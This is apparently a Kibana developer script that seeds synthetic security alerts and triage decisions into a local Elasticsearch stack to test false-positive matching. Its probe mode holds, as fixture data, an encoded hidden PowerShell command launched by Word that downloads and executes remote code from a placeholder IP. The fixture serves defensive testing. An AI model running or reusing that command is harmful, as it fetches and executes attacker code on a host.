#!/usr/bin/env node
/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

/**
 * Seeds Alert Triage decisions and the alerts they match, so the sweep's decision matching can be
 * tried without a model or a proposal approval. It writes, into a local stack:
 *
 *   - 11 open alerts of one fixture rule, in three exact patterns:
 *       A  acme-update.exe   5 low + 1 high alerts   an approved decision      -> would_close (low), kept with a human (high)
 *       B  scan.exe          3 medium alerts         a dismissed decision       -> would_skip
 *       C  unknown.exe       2 low alerts            no decision                -> never matched
 *   - the two decisions (`fp-decision-<hash>`, `fp-dismissal-<hash>`) in the `security-investigations`
 *     Knowledge Item index, built with the same code the store step uses.
 *
 * The keys come from the real key code, so a change to the key rules changes the seed with it.
 *
 * Usage:
 *   node x-pack/solutions/security/plugins/alertzero/scripts/seed_triage_decisions.js [options]
 *
 *   --es      Elasticsearch base URL (default: http://localhost:9200)
 *   --space   Kibana space id (default: default)
 *   --clean   Delete what this script wrote instead of seeding
 *   --ui      Write alerts only, for a manual test through the UI: first | matching | mixed (see UI mode)
 *
 * Scale mode (`--scale <alerts>`) writes that many open alerts instead of the 11, spread over rules
 * and exact patterns, with decisions for a share of the patterns. It needs no model. It prints what
 * a sweep should report, so the match step's paging, `mget` chunking, daily cap and note limit can
 * be checked against the numbers:
 *
 *   --scale           Number of open alerts to write (for example 25000)
 *   --rules           Fixture rules (default 45)
 *   --keys-per-rule   Exact patterns per rule (default 40)
 *   --decision-share  Share of the patterns that get a decision, 0 to 1 (default 0.5)
 *   --hot-keys        Approved patterns that get 4% of all alerts each, to reach the daily cap (default 3)
 *
 * Probe mode (`--probe`) writes 26 alerts with realistic content for a real model to analyse: two
 * benign patterns and one suspicious pattern (encoded PowerShell started by Word) that all have an
 * approved decision on purpose, and one benign pattern with a dismissed decision. In shadow the
 * sweep tags the approved ones `az:would_close:*` and the model gives its own verdict, so the
 * alerts where the two disagree show how good a key is. It costs about three batch analyses.
 *
 * UI mode (`--ui first|matching|mixed`) writes alerts only, with no decision, for a manual test that
 * goes through the UI: a real model analyses the alerts, an analyst approves the proposal, and the
 * approval stores the decision. Run the three phases in order, and run an Alert Triage sweep (run the
 * `system-security-floor-alert-triage-default` workflow) between them:
 *
 *   first     6 low alerts of a benign vendor updater (pattern U) in one rule
 *   matching  6 more alerts of the same pattern U
 *   mixed     3 alerts of pattern U (match), and 5 near misses that must NOT match: the same
 *             executable with another signer, the same executable started by another parent, a
 *             high severity alert of pattern U, the same pattern in another rule, and another
 *             executable
 *
 * Local stacks only: it uses the development login (`ES_USERNAME` / `ES_PASSWORD`, default
 * elastic / changeme).
 */

require('@kbn/setup-node-env');
require('@kbn/swc-register').install();

const { randomUUID } = require('crypto');
const {
  decisionId,
  buildDecisionDocument,
  groupByStrictKey,
} = require('../server/alert_triage/fp_decisions');
const { HUNT_COVERAGE_AI_INDEX_DEST } = require('../common/step_types/package_report');

const args = process.argv.slice(2);
const flag = (name, fallback) => {
  const i = args.indexOf(name);
  return i !== -1 && args[i + 1] ? args[i + 1] : fallback;
};
const ES_URL = flag('--es', 'http://localhost:9200');
const SPACE = flag('--space', 'default');
const CLEAN = args.includes('--clean');
const SCALE = Number(flag('--scale', '0'));
const RULES = Number(flag('--rules', '45'));
const KEYS_PER_RULE = Number(flag('--keys-per-rule', '40'));
const DECISION_SHARE = Number(flag('--decision-share', '0.5'));
const HOT_KEYS = Number(flag('--hot-keys', '3'));
const PROBE = args.includes('--probe');
const UI_PHASE = flag('--ui', '');
const ALERTS_INDEX = `.alerts-security.alerts-${SPACE}`;
const DECISIONS_INDEX = HUNT_COVERAGE_AI_INDEX_DEST.value;
const AUTH = `${process.env.ES_USERNAME ?? 'elastic'}:${process.env.ES_PASSWORD ?? 'changeme'}`;
const FIXTURE_TAG = 'triage-decisions-fixture';
// A fixed rule, so a second run adds alerts to the same rule and the keys stay the same.
const RULE_UUID = '7c1f0c9e-5a3b-4f6e-9a21-0c0ffee00001';
const RULE_REVISION = 1;
const RULE_NAME = 'Triage decisions fixture: unsigned updater runs';

const RISK_SCORES = { low: 21, medium: 47, high: 73 };
const PATTERNS = {
  A: { executable: 'C:\\Program Files\\Acme\\Updater\\acme-update.exe', subject: 'Acme Corp' },
  B: { executable: 'C:\\Tools\\Inventory\\scan.exe', subject: 'Contoso IT' },
  C: { executable: 'C:\\Users\\Public\\unknown.exe', subject: 'Unknown Publisher' },
};
const ALERTS = [
  ...Array.from({ length: 5 }, () => ({ pattern: 'A', severity: 'low' })),
  { pattern: 'A', severity: 'high' },
  ...Array.from({ length: 3 }, () => ({ pattern: 'B', severity: 'medium' })),
  ...Array.from({ length: 2 }, () => ({ pattern: 'C', severity: 'low' })),
];

const es = async (method, path, body, ndjson = false) => {
  const res = await fetch(`${ES_URL}${path}`, {
    method,
    headers: {
      'Content-Type': ndjson ? 'application/x-ndjson' : 'application/json',
      Authorization: `Basic ${Buffer.from(AUTH).toString('base64')}`,
    },
    body: ndjson || body === undefined ? body : JSON.stringify(body),
  });
  const json = await res.json();
  if (!res.ok) throw new Error(`${method} ${path} -> ${res.status}: ${JSON.stringify(json)}`);
  return json;
};

const alertDocument = ({
  executable,
  subject,
  severity,
  ruleUuid = RULE_UUID,
  ruleName = RULE_NAME,
  timestamp = new Date(),
  extra = {},
}) => {
  const now = timestamp.toISOString();
  const uuid = randomUUID();
  return {
    uuid,
    doc: {
      '@timestamp': now,
      'event.kind': 'signal',
      'event.category': ['process'],
      'event.type': ['start'],
      'host.name': 'triage-fixture-host',
      'host.os.type': 'windows',
      'user.name': 'triage-fixture-user',
      'process.name': executable.split('\\').pop(),
      'process.executable': executable,
      'process.code_signature.exists': true,
      'process.code_signature.trusted': true,
      'process.code_signature.subject_name': subject,
      'kibana.version': '9.5.0',
      'kibana.alert.uuid': uuid,
      'kibana.alert.status': 'active',
      'kibana.alert.workflow_status': 'open',
      'kibana.alert.workflow_assignee_ids': [],
      'kibana.alert.space_ids': [SPACE],
      'kibana.alert.severity': severity,
      'kibana.alert.risk_score': RISK_SCORES[severity],
      'kibana.alert.reason': `${ruleName} on triage-fixture-host`,
      'kibana.alert.depth': 1,
      'kibana.alert.start': now,
      'kibana.alert.last_detected': now,
      'kibana.alert.original_time': now,
      'kibana.alert.rule.uuid': ruleUuid,
      'kibana.alert.rule.rule_id': 'triage-decisions-fixture',
      'kibana.alert.rule.revision': RULE_REVISION,
      'kibana.alert.rule.name': ruleName,
      'kibana.alert.rule.severity': severity,
      'kibana.alert.rule.risk_score': 21,
      'kibana.alert.rule.consumer': 'siem',
      'kibana.alert.rule.producer': 'siem',
      'kibana.alert.rule.rule_type_id': 'siem.queryRule',
      'kibana.alert.rule.category': 'Custom Query Rule',
      'kibana.alert.rule.type': 'query',
      'kibana.alert.rule.enabled': true,
      'kibana.alert.rule.tags': [FIXTURE_TAG],
      'kibana.alert.rule.execution.uuid': randomUUID(),
      'kibana.alert.rule.parameters': { type: 'query', language: 'kuery', query: '*' },
      ...extra,
    },
  };
};

const decisionDocuments = (alerts) => {
  const byPattern = (name) =>
    alerts.filter(({ pattern }) => pattern === name).map(({ uuid, doc }) => ({ id: uuid, doc }));
  const group = (name) => groupByStrictKey({ alerts: byPattern(name), spaceId: SPACE }).groups[0];
  const provenance = (proposalId) => ({
    spaceId: SPACE,
    proposalId,
    investigationId: 'triage-decisions-fixture',
    approver: 'seed-script',
    now: new Date(),
  });
  return [
    {
      id: decisionId('false_positive', group('A').hash),
      doc: buildDecisionDocument({
        kind: 'false_positive',
        group: group('A'),
        provenance: provenance('seed-approved'),
      }),
    },
    {
      id: decisionId('do_not_propose', group('B').hash),
      doc: buildDecisionDocument({
        kind: 'do_not_propose',
        group: group('B'),
        provenance: provenance('seed-dismissed'),
      }),
    },
  ];
};

const clean = async () => {
  const alerts = await es(
    'POST',
    `/${ALERTS_INDEX}/_delete_by_query?refresh=true&conflicts=proceed`,
    {
      query: { term: { 'kibana.alert.rule.tags': FIXTURE_TAG } },
    }
  );
  console.log(`Deleted ${alerts.deleted} fixture alert(s) from ${ALERTS_INDEX}.`);
  const decisions = await es(
    'POST',
    `/${DECISIONS_INDEX}/_delete_by_query?refresh=true&conflicts=proceed`,
    {
      // UI mode decisions are written by a real approval, so they carry the UI rules, not the fixture investigation.
      query: {
        bool: {
          should: [
            { term: { 'attributes.investigation_id': 'triage-decisions-fixture' } },
            { terms: { 'attributes.rule_id': [UI_RULE.ruleUuid, UI_OTHER_RULE.ruleUuid] } },
          ],
          minimum_should_match: 1,
        },
      },
    }
  ).catch((error) => {
    if (String(error).includes('index_not_found_exception')) return { deleted: 0 };
    throw error;
  });
  console.log(`Deleted ${decisions.deleted} fixture decision(s) from ${DECISIONS_INDEX}.`);
};

const assertAlertsIndex = async () => {
  // Writing to a missing alerts alias would create a dynamically mapped index that the alerts
  // template does not cover, so stop and say how to create the real one.
  const aliasResponse = await fetch(`${ES_URL}/_alias/${ALERTS_INDEX}`, {
    headers: { Authorization: `Basic ${Buffer.from(AUTH).toString('base64')}` },
  });
  if (!aliasResponse.ok) {
    throw new Error(
      `${ALERTS_INDEX} does not exist yet. Open Security in Kibana once, or call POST /api/detection_engine/index, then run this again.`
    );
  }
};

const seed = async () => {
  await assertAlertsIndex();
  const alerts = ALERTS.map(({ pattern, severity }) => ({
    ...alertDocument({ ...PATTERNS[pattern], severity }),
    pattern,
  }));
  const decisions = decisionDocuments(alerts);

  const alertLines = alerts.flatMap(({ uuid, doc }) => [
    JSON.stringify({ create: { _index: ALERTS_INDEX, _id: uuid } }),
    JSON.stringify(doc),
  ]);
  const alertResult = await es('POST', '/_bulk?refresh=true', `${alertLines.join('\n')}\n`, true);
  if (alertResult.errors)
    throw new Error(JSON.stringify(alertResult.items.find((i) => i.create.error)));

  const decisionLines = decisions.flatMap(({ id, doc }) => [
    JSON.stringify({ index: { _index: DECISIONS_INDEX, _id: id } }),
    JSON.stringify(doc),
  ]);
  const decisionResult = await es(
    'POST',
    '/_bulk?refresh=true',
    `${decisionLines.join('\n')}\n`,
    true
  );
  if (decisionResult.errors) {
    throw new Error(JSON.stringify(decisionResult.items.find((i) => i.index.error)));
  }

  console.log(`Indexed ${alerts.length} open alerts into ${ALERTS_INDEX}.`);
  console.log(`Wrote 2 decisions into ${DECISIONS_INDEX}:`);
  for (const { id } of decisions) console.log(`  ${id}`);
  console.log('\nIn shadow mode the next sweep should tag:');
  console.log('  5 low alerts of pattern A   az:would_close:<fp-decision id>');
  console.log('  3 alerts of pattern B       az:would_skip:<fp-dismissal id>');
  console.log(
    'and leave the high alert of A and the 2 alerts of C untagged (the high alert is counted as excluded_by_severity).'
  );
};

// ── Scale mode ────────────────────────────────────────────────────────────────

const HOT_SHARE = 0.04;
const WINDOW_MINUTES = 20 * 60;
const BULK_ALERTS = 5000;
const BULK_DECISIONS = 500;
// What one sweep reads, and the limits the match step applies. Keep in step with the step.
const MAX_CANDIDATES = 100000;
const DAILY_CLOSE_CAP = 500;
const NOTES_PER_SWEEP = 1000;
const AUTO_CLOSE_SEVERITIES = ['low', 'medium'];

// A small seeded generator, so a second run writes the same alerts and the same decisions.
const seededRandom = (seed) => {
  let state = seed;
  return () => {
    state = (state + 0x6d2b79f5) | 0;
    let t = Math.imul(state ^ (state >>> 15), 1 | state);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
};

const pickSeverity = (value) => {
  if (value < 0.7) return 'low';
  return value < 0.95 ? 'medium' : 'high';
};

const bulk = async (index, action, rows) => {
  const lines = rows.flatMap(({ id, doc }) => [
    JSON.stringify({ [action]: { _index: index, _id: id } }),
    JSON.stringify(doc),
  ]);
  const result = await es('POST', '/_bulk', `${lines.join('\n')}\n`, true);
  if (result.errors) {
    throw new Error(JSON.stringify(result.items.find((item) => item[action].error)));
  }
};

const scale = async () => {
  await assertAlertsIndex();
  const random = seededRandom(42);
  const keys = Array.from({ length: RULES * KEYS_PER_RULE }, (_unused, i) => {
    const rule = Math.floor(i / KEYS_PER_RULE);
    const program = `Vendor${rule}-${i % KEYS_PER_RULE}`;
    return {
      ruleUuid: `7c1f0c9e-5a3b-4f6e-9a21-${String(rule).padStart(12, '0')}`,
      ruleName: `Triage scale fixture ${rule}`,
      executable: `C:\\Program Files\\${program}\\agent.exe`,
      subject: `${program} Ltd`,
    };
  });
  // The hot keys come first and are always approved: they get enough alerts to reach the daily cap.
  const kinds = keys.map((_key, i) => {
    if (i < HOT_KEYS) return 'false_positive';
    if (random() >= DECISION_SHARE) return undefined;
    return random() < 0.9 ? 'false_positive' : 'do_not_propose';
  });

  const now = Date.now();
  const counts = keys.map(() => ({ approvedClosable: 0, approvedOther: 0, dismissed: 0 }));
  const expected = { candidates: 0, wouldClose: 0, wouldSkip: 0, excludedBySeverity: 0 };
  let written = 0;
  let batch = [];
  const flush = async () => {
    if (batch.length === 0) return;
    await bulk(ALERTS_INDEX, 'create', batch);
    written += batch.length;
    batch = [];
    process.stdout.write(`\r  ${written} / ${SCALE} alerts`);
  };

  const hotTotal = Math.min(HOT_KEYS * HOT_SHARE, 0.5);
  for (let i = 0; i < SCALE; i++) {
    const draw = random();
    const keyIndex =
      draw < hotTotal
        ? Math.floor(draw / HOT_SHARE)
        : HOT_KEYS + Math.floor(random() * (keys.length - HOT_KEYS));
    const severity = pickSeverity(random());
    // Oldest first, one timestamp per minute: many alerts share a timestamp, so a page boundary
    // falls inside a tie and only the uuid tiebreak keeps `search_after` from skipping or repeating one.
    const minutesAgo = Math.floor(((SCALE - 1 - i) * WINDOW_MINUTES) / SCALE);
    const timestamp = new Date(Math.floor(now / 60000) * 60000 - minutesAgo * 60000);
    const { uuid, doc } = alertDocument({ ...keys[keyIndex], severity, timestamp });
    batch.push({ id: uuid, doc });

    if (i < MAX_CANDIDATES) {
      expected.candidates++;
      const kind = kinds[keyIndex];
      if (kind === 'do_not_propose') {
        expected.wouldSkip++;
        counts[keyIndex].dismissed++;
      } else if (kind === 'false_positive') {
        if (AUTO_CLOSE_SEVERITIES.includes(severity)) {
          expected.wouldClose++;
          counts[keyIndex].approvedClosable++;
        } else {
          expected.excludedBySeverity++;
          counts[keyIndex].approvedOther++;
        }
      }
    }
    if (batch.length >= BULK_ALERTS) await flush();
  }
  await flush();
  process.stdout.write('\n');
  await es('POST', `/${ALERTS_INDEX}/_refresh`);

  const decisionRows = [];
  keys.forEach((key, i) => {
    const kind = kinds[i];
    if (kind === undefined) return;
    const { uuid, doc } = alertDocument({ ...key, severity: 'low' });
    const group = groupByStrictKey({ alerts: [{ id: uuid, doc }], spaceId: SPACE }).groups[0];
    decisionRows.push({
      id: decisionId(kind, group.hash),
      doc: buildDecisionDocument({
        kind,
        group,
        provenance: {
          spaceId: SPACE,
          proposalId: 'scale-fixture',
          investigationId: 'triage-decisions-fixture',
          approver: 'seed-script',
          now: new Date(),
        },
      }),
    });
  });
  for (let from = 0; from < decisionRows.length; from += BULK_DECISIONS) {
    await bulk(DECISIONS_INDEX, 'index', decisionRows.slice(from, from + BULK_DECISIONS));
  }
  await es('POST', `/${DECISIONS_INDEX}/_refresh`);

  const closableByKey = counts.map(({ approvedClosable }) => approvedClosable);
  const closed = closableByKey.reduce((sum, n) => sum + Math.min(n, DAILY_CLOSE_CAP), 0);
  const capped = closableByKey.reduce((sum, n) => sum + Math.max(0, n - DAILY_CLOSE_CAP), 0);
  const acted = closed + expected.wouldSkip;
  // A pattern whose approved alerts are all above the severity limit is not counted as matched.
  const matchedKeys = counts.filter(
    ({ approvedClosable, dismissed }) => approvedClosable + dismissed > 0
  ).length;
  console.log(
    `Indexed ${written} open alerts over ${keys.length} patterns in ${RULES} rules, and ${decisionRows.length} decisions.`
  );
  console.log(
    '\nA sweep should report (the oldest 100000 alerts are read at most; counts near the'
  );
  console.log('100000th alert can differ by the size of one timestamp tie):');
  console.log(`  candidates            ${expected.candidates}`);
  console.log(`  decisions_matched     ${matchedKeys}`);
  console.log(`  would_close           ${expected.wouldClose}`);
  console.log(`  would_skip            ${expected.wouldSkip}`);
  console.log(`  excluded_by_severity  ${expected.excludedBySeverity}`);
  console.log('In on mode, in the first sweep:');
  console.log(`  closed ${closed}, skipped ${expected.wouldSkip}, capped ${capped}`);
  console.log(
    `  notes_missing ${Math.max(
      0,
      acted - NOTES_PER_SWEEP
    )} (limit ${NOTES_PER_SWEEP} notes a sweep)`
  );
};

// ── Probe mode ────────────────────────────────────────────────────────────────

const PROBE_PATTERNS = [
  {
    label: 'benign vendor updater',
    kind: 'false_positive',
    count: 6,
    severity: 'low',
    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0001',
    ruleName: 'Triage probe: vendor updater runs',
    executable: 'C:\\Program Files\\Acme\\Updater\\acme-update.exe',
    subject: 'Acme Corp',
    extra: {
      'process.command_line':
        '"C:\\Program Files\\Acme\\Updater\\acme-update.exe" --scheduled-check',
      'process.parent.name': 'services.exe',
      'user.name': 'SYSTEM',
    },
  },
  {
    label: 'benign backup agent',
    kind: 'false_positive',
    count: 6,
    severity: 'low',
    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0001',
    ruleName: 'Triage probe: vendor updater runs',
    executable: 'C:\\Program Files\\Contoso Backup\\backup-agent.exe',
    subject: 'Contoso Ltd',
    extra: {
      'process.command_line': '"C:\\Program Files\\Contoso Backup\\backup-agent.exe" --nightly',
      'process.parent.name': 'services.exe',
      'user.name': 'SYSTEM',
    },
  },
  {
    label: 'suspicious encoded PowerShell started by Word (approved on purpose)',
    kind: 'false_positive',
    count: 8,
    severity: 'medium',
    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0002',
    ruleName: 'Triage probe: PowerShell started by an Office app',
    executable: 'C:\\Users\\Public\\Libraries\\powershell.exe',
    subject: 'Unsigned',
    extra: {
      'process.command_line':
        'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMAAvAGEAJwApAA==',
      'process.parent.name': 'WINWORD.EXE',
      'process.parent.command_line':
        '"WINWORD.EXE" /n "C:\\Users\\bob\\Downloads\\invoice_4471.docm"',
      'process.code_signature.exists': false,
      'process.code_signature.trusted': false,
      'user.name': 'bob',
    },
  },
  {
    label: 'benign inventory scanner (dismissed)',
    kind: 'do_not_propose',
    count: 6,
    severity: 'low',
    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0003',
    ruleName: 'Triage probe: inventory scanner runs',
    executable: 'C:\\Tools\\Inventory\\scan.exe',
    subject: 'Contoso IT',
    extra: {
      'process.command_line': '"C:\\Tools\\Inventory\\scan.exe" /quiet /report',
      'process.parent.name': 'taskeng.exe',
      'user.name': 'svc-inventory',
    },
  },
];

const probe = async () => {
  await assertAlertsIndex();
  const alertRows = [];
  const decisionRows = [];
  for (const pattern of PROBE_PATTERNS) {
    const { count, kind, label, ...fields } = pattern;
    const alerts = Array.from({ length: count }, () => alertDocument(fields));
    alerts.forEach(({ uuid, doc }) => alertRows.push({ id: uuid, doc }));
    const group = groupByStrictKey({
      alerts: alerts.map(({ uuid, doc }) => ({ id: uuid, doc })),
      spaceId: SPACE,
    }).groups[0];
    decisionRows.push({
      id: decisionId(kind, group.hash),
      doc: buildDecisionDocument({
        kind,
        group,
        provenance: {
          spaceId: SPACE,
          proposalId: 'probe-fixture',
          investigationId: 'triage-decisions-fixture',
          approver: 'seed-script',
          now: new Date(),
        },
      }),
    });
    console.log(
      `  ${String(count).padStart(2)} ${fields.severity.padEnd(6)} ${kind.padEnd(14)} ${label}`
    );
  }
  // Decisions first, so a sweep that starts while this runs cannot see alerts without them.
  await bulk(DECISIONS_INDEX, 'index', decisionRows);
  await es('POST', `/${DECISIONS_INDEX}/_refresh`);
  await bulk(ALERTS_INDEX, 'create', alertRows);
  await es('POST', `/${ALERTS_INDEX}/_refresh`);
  console.log(`Wrote ${alertRows.length} alerts and ${decisionRows.length} decisions.`);
};

// ── UI mode ───────────────────────────────────────────────────────────────────

const UI_RULE = {
  ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000b0001',
  ruleName: 'Triage UI test: vendor updater runs',
};
const UI_OTHER_RULE = {
  ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000b0002',
  ruleName: 'Triage UI test: vendor updater runs (copy)',
};
const UI_UPDATER = 'C:\\Program Files\\Acme\\Updater\\acme-update.exe';
// Pattern U: the strict key is the rule, the executable, the signer and the parent executable.
const uiAlert = (overrides = {}) => {
  const executable = overrides.executable ?? UI_UPDATER;
  const { extra, ...rest } = overrides;
  return {
    ...UI_RULE,
    executable,
    subject: 'Acme Corp',
    severity: 'low',
    ...rest,
    extra: {
      'process.command_line': `"${executable}" --scheduled-check`,
      'process.parent.name': 'services.exe',
      'process.parent.executable': 'C:\\Windows\\System32\\services.exe',
      'user.name': 'SYSTEM',
      ...extra,
    },
  };
};

const UI_PHASES = {
  first: [{ label: 'pattern U (benign updater)', count: 6, alert: uiAlert() }],
  matching: [{ label: 'pattern U again', count: 6, alert: uiAlert() }],
  mixed: [
    { label: 'pattern U: must match', count: 3, alert: uiAlert() },
    {
      label: 'same executable, other signer: must not match',
      count: 1,
      alert: uiAlert({
        subject: 'Unknown Publisher',
        extra: { 'process.code_signature.trusted': false },
      }),
    },
    {
      label: 'same executable, other parent: must not match',
      count: 1,
      alert: uiAlert({
        extra: {
          'process.parent.name': 'cmd.exe',
          'process.parent.executable': 'C:\\Windows\\System32\\cmd.exe',
        },
      }),
    },
    {
      label: 'pattern U, high severity: matches but is not closable',
      count: 1,
      alert: uiAlert({ severity: 'high' }),
    },
    {
      label: 'pattern U in another rule: must not match',
      count: 1,
      alert: uiAlert(UI_OTHER_RULE),
    },
    {
      label: 'another executable: must not match',
      count: 1,
      alert: uiAlert({
        executable: 'C:\\Program Files\\Acme\\Updater\\acme-helper.exe',
        subject: 'Acme Corp',
      }),
    },
  ],
};

const uiSeed = async () => {
  const phase = UI_PHASES[UI_PHASE];
  if (!phase) throw new Error(`--ui takes one of: ${Object.keys(UI_PHASES).join(', ')}`);
  await assertAlertsIndex();
  const rows = phase.flatMap(({ label, count, alert }) => {
    console.log(`  ${String(count).padStart(2)} ${alert.severity.padEnd(6)} ${label}`);
    return Array.from({ length: count }, () => {
      const { uuid, doc } = alertDocument(alert);
      return { id: uuid, doc };
    });
  });
  await bulk(ALERTS_INDEX, 'create', rows);
  await es('POST', `/${ALERTS_INDEX}/_refresh`);
  console.log(`Wrote ${rows.length} open alerts. No decision was written.`);
};

const run = () => {
  if (CLEAN) return clean();
  if (UI_PHASE) return uiSeed();
  if (PROBE) return probe();
  return SCALE > 0 ? scale() : seed();
};

run().catch((error) => {
  console.error(error.message);
  process.exit(1);
});
